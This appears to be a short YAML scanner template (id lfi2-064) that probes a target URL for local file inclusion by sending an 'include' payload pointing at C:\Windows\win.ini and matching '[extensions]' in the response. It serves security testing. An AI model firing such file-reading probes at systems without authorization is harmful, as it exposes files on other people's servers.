id: lfi2-064
name: 'Path traversal2 via include'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via include'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      include:
        - 'C:\Windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
